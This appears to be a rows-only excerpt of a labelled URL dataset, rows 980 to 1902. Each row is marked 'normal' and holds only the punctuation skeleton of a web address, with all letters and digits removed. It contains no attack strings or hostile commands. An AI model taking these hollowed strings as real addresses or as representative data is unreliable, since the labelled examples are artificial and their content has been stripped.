980,normal,". . . ? = & = & = "
981,normal,". . . / ? = & = & = "
982,normal,". . . / ? = "
983,normal,". . . / / / ? = "
984,normal,". . . / ? = & = & = "
985,normal,". . . . ? = & = & = "
986,normal,". . . "
987,normal,". . / / / ? = "
988,normal,". . "
989,normal,". . . "
990,normal,". . / / / "
991,normal,". . / / / "
992,normal,". . . / ? = & = "
993,normal,". . . . / / "
994,normal,". . . . / / / / ? = & = & = "
995,normal,". . / / ? = "
996,normal,". . . . / / / ? = & = "
997,normal,". . . / / / ? = & = & = "
998,normal,". . . . ? = & = "
999,normal,". . . "
1000,normal,". . . / / / ? = & = & = "
1001,normal,". . . / / / / ? = "
1002,normal,". . . . / "
1003,normal,". . . ? = "
1004,normal,". . / / ? = & = & = "
1005,normal,". . . "
1006,normal,". . ? = & = & = "
1007,normal,". . . / / / ? = "
1008,normal,". . / / / / ? = "
1009,normal,". . . "
1010,normal,". . . ? = & = "
1011,normal,". . . . / / ? = "
1012,normal,". . . . / / / "
1013,normal,". . ? = & = "
1014,normal,". . . . ? = & = & = "
1015,normal,". . / / / ? = & = & = "
1016,normal,". . . / ? = & = & = "
1017,normal,". . . . ? = & = "
1018,normal,". . . . / ? = & = & = "
1019,normal,". . "
1020,normal,". . . / / / / ? = & = & = "
1021,normal,". . . . ? = & = & = "
1022,normal,". . . . / / / ? = "
1023,normal,". . . / / / "
1024,normal,". . / / ? = & = & = "
1025,normal,". . . . / / / / ? = "
1026,normal,". . / ? = "
1027,normal,". . . / / / ? = & = & = "
1028,normal,". . / / / ? = & = & = "
1029,normal,". . . . / / / / ? = "
1030,normal,". . / / / ? = & = & = "
1031,normal,". . . / ? = & = & = "
1032,normal,". . . / ? = & = "
1033,normal,". . . / ? = & = & = "
1034,normal,". . . / ? = "
1035,normal,". . . . / "
1036,normal,". "
1037,normal,". . . . / / ? = "
1038,normal,". . / / / "
1039,normal,". . . / / / / ? = & = & = "
1040,normal,". . . . / ? = & = & = "
1041,normal,". . . / / / / ? = "
1042,normal,". . . / / ? = "
1043,normal,". . / / / / ? = & = & = "
1044,normal,". . . . ? = & = & = "
1045,normal,". . . / / ? = & = & = "
1046,normal,". . . "
1047,normal,". . . / / / ? = "
1048,normal,". . / ? = & = "
1049,normal,". . "
1050,normal,". . . . / / ? = & = "
1051,normal,". . . . / / / ? = & = & = "
1052,normal,". . / / / / ? = "
1053,normal,". . . . / / / "
1054,normal,". . . . / / / / ? = & = & = "
1055,normal,". . . . / / / ? = & = & = "
1056,normal,". . . / "
1057,normal,". . . / / / / ? = "
1058,normal,". . . ? = & = & = "
1059,normal,". . / / ? = "
1060,normal,". . . / / / / ? = "
1061,normal,". . . / / / "
1062,normal,". . / / ? = "
1063,normal,". . . / / ? = & = "
1064,normal,". . / / / / ? = & = & = "
1065,normal,". . . / / / "
1066,normal,". . . / / ? = "
1067,normal,". . . . ? = & = "
1068,normal,". "
1069,normal,". . . . ? = "
1070,normal,". . . . ? = "
1071,normal,". . / / / ? = "
1072,normal,". . . / / / / ? = & = "
1073,normal,". . . / / / ? = & = "
1074,normal,". . / / ? = "
1075,normal,". . . . / ? = & = & = "
1076,normal,". . / / ? = & = & = "
1077,normal,". . . . / / / / ? = & = & = "
1078,normal,". . . . ? = & = "
1079,normal,". . / / / / ? = & = & = "
1080,normal,". . . . / / ? = "
1081,normal,". . ? = & = "
1082,normal,". . . / / ? = & = "
1083,normal,". . . "
1084,normal,". . ? = & = "
1085,normal,". . "
1086,normal,". . ? = "
1087,normal,". . / ? = & = "
1088,normal,". . . / / ? = & = & = "
1089,normal,". . . / / / / ? = & = & = "
1090,normal,". . . / / / / ? = "
1091,normal,". . . "
1092,normal,". . . . / / "
1093,normal,". . . . / / / ? = "
1094,normal,". . / / ? = "
1095,normal,". . / / / / ? = "
1096,normal,". . / / / ? = & = & = "
1097,normal,". . ? = & = & = "
1098,normal,". . . / / / ? = "
1099,normal,". . / / / / ? = "
1100,normal,". . . . / / / ? = "
1101,normal,". . . . ? = & = & = "
1102,normal,". . . . ? = "
1103,normal,". . . . / / / ? = & = & = "
1104,normal,". . / / / / ? = & = "
1105,normal,". . . . / "
1106,normal,". . . / / "
1107,normal,". . "
1108,normal,". . . . / / / "
1109,normal,". . . / ? = & = "
1110,normal,". . . / / / ? = "
1111,normal,". . . / / / ? = & = & = "
1112,normal,". . / / ? = "
1113,normal,". . . ? = & = & = "
1114,normal,". . / "
1115,normal,". . ? = & = "
1116,normal,". . . . / / / / ? = "
1117,normal,". . ? = "
1118,normal,". . . . / / / / ? = & = & = "
1119,normal,". . "
1120,normal,". . . ? = & = "
1121,normal,". . / / / "
1122,normal,". . . . ? = & = "
1123,normal,". . . "
1124,normal,". . . ? = & = "
1125,normal,". . . / / / ? = "
1126,normal,". . . / ? = & = & = "
1127,normal,". . . . ? = & = "
1128,normal,". . . . / / / ? = & = & = "
1129,normal,". . . . ? = & = & = "
1130,normal,". . . / / / / ? = & = "
1131,normal,". . "
1132,normal,". . / / / "
1133,normal,". . "
1134,normal,". . ? = & = & = "
1135,normal,". . . . / / ? = "
1136,normal,". "
1137,normal,". . / / / ? = "
1138,normal,". . ? = & = & = "
1139,normal,". . . . / / / / ? = & = "
1140,normal,". . . / / ? = "
1141,normal,". "
1142,normal,". . . / / / ? = & = & = "
1143,normal,". . . . / ? = "
1144,normal,". . / / ? = "
1145,normal,". . . / / / / ? = & = & = "
1146,normal,". . / / / ? = & = & = "
1147,normal,". . . / / / ? = & = "
1148,normal,". . . / ? = & = "
1149,normal,". . ? = & = "
1150,normal,". . . . / "
1151,normal,". . . / / / / ? = "
1152,normal,". . . . ? = "
1153,normal,". . / / ? = & = "
1154,normal,". . . . / "
1155,normal,". . / / ? = & = & = "
1156,normal,". . ? = & = "
1157,normal,". . . ? = & = & = "
1158,normal,". . . . / / / ? = "
1159,normal,". . . / / / ? = & = "
1160,normal,". . . / "
1161,normal,". . . . / ? = & = "
1162,normal,". . . / ? = "
1163,normal,". . . . / / ? = & = "
1164,normal,". . . ? = "
1165,normal,". . . . / "
1166,normal,". "
1167,normal,". . . "
1168,normal,". . . . / / ? = "
1169,normal,". . . / / "
1170,normal,". . . . / ? = "
1171,normal,". . / / / "
1172,normal,". . . . / "
1173,normal,". . . . / / / / ? = & = "
1174,normal,". . / / / / ? = "
1175,normal,". . / ? = "
1176,normal,". . / / "
1177,normal,". . . . / / / ? = "
1178,normal,". . . / / / ? = & = "
1179,normal,". . . . / / / / ? = "
1180,normal,". . . . / / / "
1181,normal,". . . / / / "
1182,normal,". . / / / / ? = & = & = "
1183,normal,". . / / ? = & = "
1184,normal,". . / / / ? = & = "
1185,normal,". . ? = & = "
1186,normal,". . ? = & = "
1187,normal,". . . / / ? = & = & = "
1188,normal,". . . / ? = & = & = "
1189,normal,". . . / / ? = & = "
1190,normal,". . / / ? = "
1191,normal,". . . ? = & = "
1192,normal,". . / / "
1193,normal,". . "
1194,normal,". . / / "
1195,normal,". . / / / ? = & = "
1196,normal,". . . / / ? = & = & = "
1197,normal,". . "
1198,normal,". . . . ? = & = "
1199,normal,". . / ? = & = & = "
1200,normal,". . . / / / ? = & = "
1201,normal,". . . / / / ? = & = & = "
1202,normal,". . / / / / ? = & = "
1203,normal,". . ? = & = & = "
1204,normal,". . . . / / / / ? = & = "
1205,normal,". . . . / ? = "
1206,normal,". . . / / / ? = & = "
1207,normal,". . . . / / / / ? = "
1208,normal,". . . / / / ? = & = "
1209,normal,". . . / / / / ? = "
1210,normal,". . . . / / ? = "
1211,normal,". . / / / / ? = & = & = "
1212,normal,". . / / / "
1213,normal,". . / / / "
1214,normal,". . / ? = & = & = "
1215,normal,". . . . / "
1216,normal,". . . . "
1217,normal,". . . . ? = "
1218,normal,". . . / / / ? = "
1219,normal,". . / / ? = & = "
1220,normal,". . "
1221,normal,". . . / / / / ? = & = "
1222,normal,". . "
1223,normal,". . . / / / ? = "
1224,normal,". . ? = "
1225,normal,". . . . / / / / ? = "
1226,normal,". . . / / ? = "
1227,normal,". . / / / / ? = & = "
1228,normal,". . . . / ? = & = & = "
1229,normal,". . . . ? = "
1230,normal,". . . / / "
1231,normal,". . . . / / ? = & = & = "
1232,normal,". . . . / / / ? = & = & = "
1233,normal,". . . . / / / / ? = & = & = "
1234,normal,". . . / / / ? = "
1235,normal,". "
1236,normal,". "
1237,normal,". . . . "
1238,normal,". . . / / / "
1239,normal,". . . . / / ? = & = & = "
1240,normal,". . . . / / / ? = "
1241,normal,". . . / ? = & = & = "
1242,normal,". . . ? = "
1243,normal,". . . "
1244,normal,". . . / / / "
1245,normal,". . . ? = "
1246,normal,". . "
1247,normal,". . . . / / / "
1248,normal,". . / / "
1249,normal,". . / / / / ? = & = & = "
1250,normal,". . / "
1251,normal,". . / "
1252,normal,". . / / / / ? = & = "
1253,normal,". . . / / / / ? = & = & = "
1254,normal,". . . . / / / "
1255,normal,". . . . ? = "
1256,normal,". . . ? = & = "
1257,normal,". . . / / / / ? = "
1258,normal,". . . / / ? = "
1259,normal,". . ? = & = & = "
1260,normal,". . . . / / / / ? = "
1261,normal,". . "
1262,normal,". . . / / / / ? = & = & = "
1263,normal,". . . . / ? = & = "
1264,normal,". . . / / / ? = "
1265,normal,". . . . / / / ? = & = & = "
1266,normal,". . . . / / / ? = "
1267,normal,". . . . / ? = "
1268,normal,". . . / / ? = & = & = "
1269,normal,". . . / / / ? = & = & = "
1270,normal,". . . ? = & = "
1271,normal,". . . . ? = & = & = "
1272,normal,". . / / / / ? = & = "
1273,normal,". . / / / ? = & = & = "
1274,normal,". . . . / / "
1275,normal,". . / / "
1276,normal,". . . / / / / ? = & = & = "
1277,normal,". . / / ? = & = "
1278,normal,". . . . / / ? = "
1279,normal,". . . . / / / / ? = "
1280,normal,". . . . / "
1281,normal,". . . . / / / / ? = "
1282,normal,". . . "
1283,normal,". . / / / ? = & = "
1284,normal,". . . / ? = & = & = "
1285,normal,". . / / / ? = & = & = "
1286,normal,". . . . / / / "
1287,normal,". . "
1288,normal,". . "
1289,normal,". . . . / / ? = & = "
1290,normal,". . . . / / / / ? = & = & = "
1291,normal,". . / ? = & = & = "
1292,normal,". . . "
1293,normal,". . "
1294,normal,". . . / / "
1295,normal,". . . ? = & = & = "
1296,normal,". . . . ? = & = "
1297,normal,". . . ? = & = "
1298,normal,". . . / / ? = & = & = "
1299,normal,". . . / / / ? = & = & = "
1300,normal,". . / / ? = "
1301,normal,". . / / / / ? = "
1302,normal,". . . . ? = & = "
1303,normal,". . . "
1304,normal,". "
1305,normal,". . . . / / / / ? = "
1306,normal,". . . ? = & = "
1307,normal,". . / ? = & = & = "
1308,normal,". . / ? = & = & = "
1309,normal,". . / / / ? = & = & = "
1310,normal,". . . ? = & = "
1311,normal,". . . . / / / / ? = & = & = "
1312,normal,". . / / / / ? = & = "
1313,normal,". . . . ? = & = & = "
1314,normal,". . . . / / / ? = & = "
1315,normal,". . "
1316,normal,". . . / / ? = & = "
1317,normal,". . / / / ? = & = "
1318,normal,". . . . / / / / ? = & = & = "
1319,normal,". . . . / / ? = & = "
1320,normal,". . ? = "
1321,normal,". . / / / "
1322,normal,". . . . / ? = & = "
1323,normal,". . ? = "
1324,normal,". . . . / / / ? = & = "
1325,normal,". . . . / / / "
1326,normal,". . . . ? = & = "
1327,normal,". . / / / / ? = "
1328,normal,". . . / ? = "
1329,normal,". . / ? = "
1330,normal,". . . / / / ? = "
1331,normal,". . . / ? = & = & = "
1332,normal,". . . / / "
1333,normal,". . . . / / "
1334,normal,". . . . / ? = & = "
1335,normal,". . . . / ? = & = "
1336,normal,". . . / / / / ? = & = "
1337,normal,". "
1338,normal,". . . / "
1339,normal,". . "
1340,normal,". . "
1341,normal,". . / / ? = "
1342,normal,". . . "
1343,normal,". . . . ? = "
1344,normal,". . / "
1345,normal,". . . / / "
1346,normal,". . / / "
1347,normal,". . . . / ? = & = & = "
1348,normal,". . ? = "
1349,normal,". . . / / ? = & = & = "
1350,normal,". . / ? = "
1351,normal,". . . . / / ? = "
1352,normal,". . . . / / "
1353,normal,". . / / / ? = "
1354,normal,". . . . / / / "
1355,normal,". . . . / "
1356,normal,". . . "
1357,normal,". . . . / / / / ? = & = "
1358,normal,". . . / / / ? = & = "
1359,normal,". . . "
1360,normal,". . . . / / ? = & = "
1361,normal,". . / / / ? = "
1362,normal,". . . / / / "
1363,normal,". . / / / / ? = & = "
1364,normal,". . . . / / "
1365,normal,". . . . / / "
1366,normal,". . . . / / / / ? = & = "
1367,normal,". . . . / / ? = & = "
1368,normal,". . . / / "
1369,normal,". . / / ? = "
1370,normal,". . . / / / / ? = "
1371,normal,". . . . / / ? = & = & = "
1372,normal,". . . . / / / ? = & = "
1373,normal,". . . / / / / ? = & = & = "
1374,normal,". . . / "
1375,normal,". . ? = & = "
1376,normal,". . / ? = "
1377,normal,". . . "
1378,normal,". . "
1379,normal,". . / / / / ? = "
1380,normal,". . . "
1381,normal,". . . . "
1382,normal,". . / / ? = "
1383,normal,". . / "
1384,normal,". . . . / / / / ? = "
1385,normal,". . / / / ? = & = & = "
1386,normal,". . . / / / / ? = "
1387,normal,". . / "
1388,normal,". . . . / / "
1389,normal,". . / ? = & = & = "
1390,normal,". . . / "
1391,normal,". . . . / / ? = "
1392,normal,". . . . / / ? = & = & = "
1393,normal,". "
1394,normal,". . / / / ? = "
1395,normal,". . / / / / ? = & = "
1396,normal,". . . . / / "
1397,normal,". . . / / / ? = & = "
1398,normal,". . . . / / / / ? = & = "
1399,normal,". . / / / / ? = & = & = "
1400,normal,". . / / ? = & = "
1401,normal,". . . . / ? = & = "
1402,normal,". . "
1403,normal,". . / / / / ? = & = & = "
1404,normal,". . . . / / ? = "
1405,normal,". . . / / / "
1406,normal,". . / / / ? = "
1407,normal,". . / ? = & = & = "
1408,normal,". . . . "
1409,normal,". . ? = & = "
1410,normal,". . . . / / ? = & = & = "
1411,normal,". . . . / ? = "
1412,normal,". . . . / "
1413,normal,". . / / / "
1414,normal,". . . / / / "
1415,normal,". . . . / / "
1416,normal,". . "
1417,normal,". . . / "
1418,normal,". . . "
1419,normal,". . / / / "
1420,normal,". . . ? = "
1421,normal,". . / / ? = "
1422,normal,". . . / / / / ? = "
1423,normal,". . . . / "
1424,normal,". . / ? = & = "
1425,normal,". . . / ? = & = & = "
1426,normal,". . / / ? = & = & = "
1427,normal,". . . . / / / ? = & = & = "
1428,normal,". . . / "
1429,normal,". . . / / / "
1430,normal,". . . / / ? = "
1431,normal,". . . / ? = & = "
1432,normal,". . / ? = & = & = "
1433,normal,". . . . / / / ? = & = "
1434,normal,". . . ? = & = "
1435,normal,". . . . / / / / ? = "
1436,normal,". . . ? = & = "
1437,normal,". . . / / / / ? = & = "
1438,normal,". . . . / / / ? = "
1439,normal,". . / ? = & = "
1440,normal,". . "
1441,normal,". . . ? = & = "
1442,normal,". . "
1443,normal,". . / / / ? = & = "
1444,normal,". . . . / / / "
1445,normal,". . . . / ? = "
1446,normal,". . . . / / / / ? = & = & = "
1447,normal,". . . / / / ? = "
1448,normal,". . ? = "
1449,normal,". . / / / ? = "
1450,normal,". . . "
1451,normal,". . . . / ? = & = & = "
1452,normal,". . . ? = & = & = "
1453,normal,". . . / / / ? = & = & = "
1454,normal,". . "
1455,normal,". . / / ? = "
1456,normal,". . . . / / ? = & = "
1457,normal,". "
1458,normal,". . ? = & = & = "
1459,normal,". . . / ? = "
1460,normal,". . . . / / / ? = "
1461,normal,". . . . ? = "
1462,normal,". . . . / / ? = "
1463,normal,". . / / / / ? = "
1464,normal,". . . . / ? = "
1465,normal,". . . . / / "
1466,normal,". . . ? = & = "
1467,normal,". . . / / ? = & = & = "
1468,normal,". . . . ? = & = "
1469,normal,". . "
1470,normal,". . . / / / ? = & = "
1471,normal,". . . . / / / ? = "
1472,normal,". . "
1473,normal,". . . . / / / / ? = "
1474,normal,". . . "
1475,normal,". . / / / ? = "
1476,normal,". . "
1477,normal,". . . . / ? = "
1478,normal,". . . . / / / / ? = "
1479,normal,". . . ? = & = "
1480,normal,". . . / / ? = "
1481,normal,". . . "
1482,normal,". . . . ? = & = "
1483,normal,". . . . / ? = & = "
1484,normal,". . . . / / / / ? = "
1485,normal,". . . / / ? = & = & = "
1486,normal,". . / ? = & = "
1487,normal,". . . . / / ? = "
1488,normal,". . "
1489,normal,". . . . / / / / ? = & = "
1490,normal,". . / / ? = & = "
1491,normal,". . . . / "
1492,normal,". . / / "
1493,normal,". . . ? = "
1494,normal,". . . "
1495,normal,". . . / / / / ? = "
1496,normal,". . . . / / "
1497,normal,". . / "
1498,normal,". . . . / ? = "
1499,normal,". . / ? = & = & = "
1500,normal,". . . . / / / / ? = "
1501,normal,". . / / "
1502,normal,". . . "
1503,normal,". . . . / / / ? = & = "
1504,normal,". . . . "
1505,normal,". . . . / ? = "
1506,normal,". . / / / "
1507,normal,". . "
1508,normal,". . / / ? = & = "
1509,normal,". . . . / / / / ? = & = "
1510,normal,". . . ? = & = "
1511,normal,". . . . / ? = & = "
1512,normal,". . . . / / ? = & = "
1513,normal,". "
1514,normal,". . . . ? = & = "
1515,normal,". . / / / / ? = & = & = "
1516,normal,". . . . / / ? = "
1517,normal,". . . . / / / ? = & = & = "
1518,normal,". . . / / / ? = "
1519,normal,". . ? = "
1520,normal,". . . . / / / ? = & = & = "
1521,normal,". . / / / ? = & = & = "
1522,normal,". . / / ? = & = "
1523,normal,". . / / / ? = "
1524,normal,". . ? = "
1525,normal,". . . . / / ? = & = "
1526,normal,". . . . ? = & = "
1527,normal,". . . / ? = "
1528,normal,". . . / / / ? = & = "
1529,normal,". . ? = & = "
1530,normal,". . / / / / ? = & = "
1531,normal,". . . / / ? = "
1532,normal,". . ? = "
1533,normal,". . . / / / / ? = & = & = "
1534,normal,". . . / ? = & = "
1535,normal,". . . . / / ? = & = & = "
1536,normal,". . / / ? = & = "
1537,normal,". . . "
1538,normal,". . . . "
1539,normal,". . . . / / / / ? = "
1540,normal,". . . / ? = "
1541,normal,". . . . / / / / ? = "
1542,normal,". . . / / / / ? = "
1543,normal,". . . / / / / ? = "
1544,normal,". . . . / "
1545,normal,". . . / / / "
1546,normal,". . / / ? = "
1547,normal,". . . . / / "
1548,normal,". . . / / / ? = & = & = "
1549,normal,". . . . "
1550,normal,". . / ? = & = "
1551,normal,". . . / ? = "
1552,normal,". . . . / ? = & = & = "
1553,normal,". . . . / / / "
1554,normal,". . . . ? = "
1555,normal,". . . / / / ? = & = & = "
1556,normal,". . "
1557,normal,". . . . ? = & = "
1558,normal,". . . . / / / ? = & = & = "
1559,normal,". . / / ? = & = "
1560,normal,". . / / ? = & = "
1561,normal,". . / / ? = & = & = "
1562,normal,". . . . / / ? = "
1563,normal,". . / "
1564,normal,". . . / / ? = & = "
1565,normal,". . . / ? = & = & = "
1566,normal,". . . / / / ? = "
1567,normal,". . . / ? = & = & = "
1568,normal,". . / ? = & = & = "
1569,normal,". . . / / / / ? = "
1570,normal,". . / ? = & = & = "
1571,normal,". . . . / "
1572,normal,". . ? = & = & = "
1573,normal,". . . / / ? = "
1574,normal,". . . / / ? = & = & = "
1575,normal,". . . "
1576,normal,". . / / / ? = & = & = "
1577,normal,". . . / / / ? = & = & = "
1578,normal,". . . . ? = & = "
1579,normal,". . . . / / / / ? = & = & = "
1580,normal,". . . . / / / / ? = & = & = "
1581,normal,". . . "
1582,normal,". . / ? = & = "
1583,normal,". . ? = "
1584,normal,". . . / / ? = "
1585,normal,". . . . / / ? = & = & = "
1586,normal,". . . / / "
1587,normal,". . . / / ? = & = & = "
1588,normal,". . . / / / ? = & = & = "
1589,normal,". . ? = "
1590,normal,". . / ? = "
1591,normal,". . . . / / ? = & = "
1592,normal,". . ? = & = "
1593,normal,". . . ? = "
1594,normal,". . . . / "
1595,normal,". . . . / / / ? = "
1596,normal,". . / / / / ? = "
1597,normal,". . . / ? = & = & = "
1598,normal,". . . ? = "
1599,normal,". . . ? = "
1600,normal,". . . . / ? = "
1601,normal,". . "
1602,normal,". . . . ? = "
1603,normal,". . . . / ? = & = "
1604,normal,". . ? = "
1605,normal,". . . / ? = "
1606,normal,". . . . / / "
1607,normal,". . . . / / ? = & = "
1608,normal,". . / / ? = "
1609,normal,". . . / / / ? = & = & = "
1610,normal,". . / / "
1611,normal,". . / / / "
1612,normal,". . . / / / / ? = & = "
1613,normal,". . . / / ? = & = "
1614,normal,". . / / / ? = & = & = "
1615,normal,". . . / "
1616,normal,". . . . / / / ? = & = "
1617,normal,". . . . ? = "
1618,normal,". . . . / / / / ? = "
1619,normal,". . / ? = & = & = "
1620,normal,". . . / "
1621,normal,". . . / / ? = "
1622,normal,". "
1623,normal,". . . . / / / ? = & = "
1624,normal,". . . / / / ? = & = & = "
1625,normal,". . . "
1626,normal,". . . / / / / ? = "
1627,normal,". . . / / / ? = "
1628,normal,". . . . / / / / ? = "
1629,normal,". . / / ? = & = "
1630,normal,". . . . / / "
1631,normal,". . . . / "
1632,normal,". . / / / "
1633,normal,". . ? = & = & = "
1634,normal,". . . . / / / / ? = & = & = "
1635,normal,". . / / ? = "
1636,normal,". . / ? = "
1637,normal,". . "
1638,normal,". . / / / ? = & = "
1639,normal,". . / / / / ? = "
1640,normal,". . / / "
1641,normal,". . / / ? = & = & = "
1642,normal,". . . . "
1643,normal,". . . / / / / ? = & = & = "
1644,normal,". . "
1645,normal,". . . / / / ? = "
1646,normal,". "
1647,normal,". . . / / / / ? = & = & = "
1648,normal,". . . / / / "
1649,normal,". . / / / / ? = "
1650,normal,". . . / / "
1651,normal,". . . / / "
1652,normal,". . / / / ? = & = & = "
1653,normal,". . . / / / ? = & = & = "
1654,normal,". . / / / / ? = & = & = "
1655,normal,". . . / / ? = & = "
1656,normal,". . / ? = & = "
1657,normal,". . . . / / ? = "
1658,normal,". . . ? = "
1659,normal,". . . . / ? = "
1660,normal,". . / / / ? = "
1661,normal,". . / / / / ? = "
1662,normal,". . . ? = & = & = "
1663,normal,". . . . / / / "
1664,normal,". . . . ? = & = "
1665,normal,". . / / ? = & = & = "
1666,normal,". . / / ? = "
1667,normal,". . . . / / ? = & = & = "
1668,normal,". . . ? = & = "
1669,normal,". . / / ? = & = & = "
1670,normal,". . / / / "
1671,normal,". . . . / ? = & = "
1672,normal,". . "
1673,normal,". . . / / / / ? = & = "
1674,normal,". . . . / / / / ? = & = "
1675,normal,". . . / / / / ? = & = & = "
1676,normal,". "
1677,normal,". . . / / / / ? = "
1678,normal,". . . "
1679,normal,". . . "
1680,normal,". . / / / / ? = & = "
1681,normal,". . ? = & = "
1682,normal,". . / / / / ? = "
1683,normal,". . . . / / ? = "
1684,normal,". . . / / / "
1685,normal,". . . . / / ? = "
1686,normal,". . "
1687,normal,". . . . / / / ? = & = & = "
1688,normal,". . . . / / / ? = & = & = "
1689,normal,". . . ? = "
1690,normal,". . . . / ? = & = & = "
1691,normal,". . . / / / ? = & = & = "
1692,normal,". . / ? = & = & = "
1693,normal,". . . . ? = "
1694,normal,". . / / / / ? = & = "
1695,normal,". . . . / / / / ? = & = "
1696,normal,". . . . / / / ? = "
1697,normal,". . . / / ? = & = "
1698,normal,". . . . ? = & = & = "
1699,normal,". . . / / ? = & = "
1700,normal,". . . / / / / ? = & = "
1701,normal,". . . / / ? = & = "
1702,normal,". . . . / ? = & = & = "
1703,normal,". . . / / / / ? = "
1704,normal,". . / "
1705,normal,". . ? = & = "
1706,normal,". . . / ? = "
1707,normal,". . / / ? = & = & = "
1708,normal,". . / / ? = "
1709,normal,". "
1710,normal,". . "
1711,normal,". . . . / ? = & = & = "
1712,normal,". . . . / / / / ? = & = "
1713,normal,". . . / / ? = "
1714,normal,". . ? = & = & = "
1715,normal,". . . . / / "
1716,normal,". . / / ? = & = "
1717,normal,". . . ? = "
1718,normal,". . / / ? = & = & = "
1719,normal,". . / ? = "
1720,normal,". . ? = "
1721,normal,". . "
1722,normal,". . . . / / ? = & = "
1723,normal,". . / / / ? = "
1724,normal,". . / / / / ? = & = & = "
1725,normal,". . ? = "
1726,normal,". . . . / ? = & = "
1727,normal,". . / / "
1728,normal,". . . . / / "
1729,normal,". . . . / / / "
1730,normal,". . / ? = & = "
1731,normal,". . / ? = & = "
1732,normal,". . / / / ? = & = "
1733,normal,". . . . / / / "
1734,normal,". . . / ? = & = "
1735,normal,". . . . / / / "
1736,normal,". . . . / / / / ? = "
1737,normal,". . / ? = & = "
1738,normal,". . . / / ? = "
1739,normal,". . . . / "
1740,normal,". . . / / / "
1741,normal,". . . . / ? = "
1742,normal,". . . ? = & = "
1743,normal,". . . . / / / ? = & = & = "
1744,normal,". . / / / ? = & = "
1745,normal,". . . "
1746,normal,". . . / ? = & = "
1747,normal,". . ? = "
1748,normal,". . . . / / / / ? = & = & = "
1749,normal,". . . . / / / ? = & = "
1750,normal,". . / / / / ? = & = "
1751,normal,". . / ? = "
1752,normal,". . . . / / / / ? = & = & = "
1753,normal,". . . . / ? = & = & = "
1754,normal,". . . / / / / ? = & = & = "
1755,normal,". . / ? = "
1756,normal,". . . "
1757,normal,". . . ? = "
1758,normal,". . / ? = & = & = "
1759,normal,". . ? = "
1760,normal,". . / / / ? = & = "
1761,normal,". . ? = & = "
1762,normal,". . / / / "
1763,normal,". . / / / / ? = & = "
1764,normal,". . / / ? = & = & = "
1765,normal,". . / "
1766,normal,". . . / / / ? = & = & = "
1767,normal,". . . / ? = & = & = "
1768,normal,". . . . "
1769,normal,". . . / / / ? = "
1770,normal,". . . "
1771,normal,". . / / / / ? = & = & = "
1772,normal,". . / / / ? = "
1773,normal,". . / / / ? = "
1774,normal,". . / / / ? = & = "
1775,normal,". . . . "
1776,normal,". . . / ? = "
1777,normal,". . / ? = & = "
1778,normal,". . ? = & = & = "
1779,normal,". . . . / / / ? = "
1780,normal,". . . . / ? = & = & = "
1781,normal,". . . . / "
1782,normal,". . . . / ? = "
1783,normal,". . . . / ? = & = "
1784,normal,". . . . / / / "
1785,normal,". . . / / / "
1786,normal,". "
1787,normal,". . . . / / "
1788,normal,". . . "
1789,normal,". . / / / ? = "
1790,normal,". . / ? = & = "
1791,normal,". . / / ? = & = & = "
1792,normal,". . . . / / ? = & = & = "
1793,normal,". . / / / "
1794,normal,". . . . / / "
1795,normal,". . / / / / ? = & = & = "
1796,normal,". . . . / / / ? = "
1797,normal,". . / / / "
1798,normal,". . . / / / / ? = "
1799,normal,". . . . / "
1800,normal,". . . . / / / / ? = & = & = "
1801,normal,". . . / ? = "
1802,normal,". . . / ? = & = "
1803,normal,". . / ? = & = & = "
1804,normal,". . . . / / / ? = & = & = "
1805,normal,". . . . / / / / ? = & = & = "
1806,normal,". . / / / ? = "
1807,normal,". . . . / / / ? = "
1808,normal,". . . . / / / / ? = & = & = "
1809,normal,". . . / ? = & = & = "
1810,normal,". . . . "
1811,normal,". . / / / ? = & = "
1812,normal,". . . / / ? = & = & = "
1813,normal,". . / / / ? = "
1814,normal,". . . ? = "
1815,normal,". . ? = & = "
1816,normal,". . / / / ? = "
1817,normal,". . / / / / ? = & = "
1818,normal,". . / / / "
1819,normal,". . . / / ? = & = "
1820,normal,". . . "
1821,normal,". . / / / / ? = & = "
1822,normal,". . . . / "
1823,normal,". . / / "
1824,normal,". . . / "
1825,normal,". . . . / / / / ? = & = & = "
1826,normal,". . . . / / "
1827,normal,". . . . / "
1828,normal,". . . . / / / / ? = & = & = "
1829,normal,". . . . / ? = "
1830,normal,". . . / / / / ? = & = & = "
1831,normal,". . . . / / "
1832,normal,". . . . / ? = "
1833,normal,". . . / / "
1834,normal,". . . / / / ? = "
1835,normal,". . ? = "
1836,normal,". . / ? = & = "
1837,normal,". . . "
1838,normal,". . / / ? = "
1839,normal,". . . . ? = & = & = "
1840,normal,". . ? = & = & = "
1841,normal,". . . "
1842,normal,". . / "
1843,normal,". . . / / / ? = & = & = "
1844,normal,". . . / / / / ? = & = "
1845,normal,". . . / ? = "
1846,normal,". . . / ? = & = & = "
1847,normal,". . / / ? = "
1848,normal,". . / / / "
1849,normal,". . . / / ? = "
1850,normal,". . . / / / / ? = "
1851,normal,". . . / ? = & = & = "
1852,normal,". . . / / / "
1853,normal,". . . . / ? = & = "
1854,normal,". . / ? = & = "
1855,normal,". . . / / / ? = "
1856,normal,". . . . / / / "
1857,normal,". . . . / "
1858,normal,". . . . / / / / ? = & = & = "
1859,normal,". . . . / / / ? = & = "
1860,normal,". . . . / / / ? = & = "
1861,normal,". . . / / / / ? = & = & = "
1862,normal,". . . / / / ? = & = "
1863,normal,". . / ? = "
1864,normal,". . / / / "
1865,normal,". . . . / "
1866,normal,". . ? = "
1867,normal,". . . . / / / "
1868,normal,". . . . / / / ? = "
1869,normal,". . . / / / ? = & = "
1870,normal,". . ? = & = "
1871,normal,". . . "
1872,normal,". . / / ? = "
1873,normal,". . . / "
1874,normal,". . . . / / ? = "
1875,normal,". "
1876,normal,". . / / "
1877,normal,". . . / / / ? = & = & = "
1878,normal,". . . . / / / / ? = & = & = "
1879,normal,". . ? = & = "
1880,normal,". . . . / / / ? = & = & = "
1881,normal,". . / / / ? = "
1882,normal,". . . . "
1883,normal,". . "
1884,normal,". . / / / ? = "
1885,normal,". . / / / ? = & = & = "
1886,normal,". . . . ? = & = "
1887,normal,". . / / ? = & = "
1888,normal,". . / / ? = "
1889,normal,". . . . / ? = & = & = "
1890,normal,". . / / ? = & = "
1891,normal,". . . . / ? = & = & = "
1892,normal,". . . . / / / ? = "
1893,normal,". . . ? = & = "
1894,normal,". . . . / / / ? = "
1895,normal,". . . / / "
1896,normal,". . . . ? = & = & = "
1897,normal,". . . . / / / ? = & = & = "
1898,normal,". . . . / / / / ? = & = "
1899,normal,". . . / / / "
1900,normal,". . / / ? = & = "
1901,normal,". . . . / / ? = "
1902,normal,". . / / / / ? = "
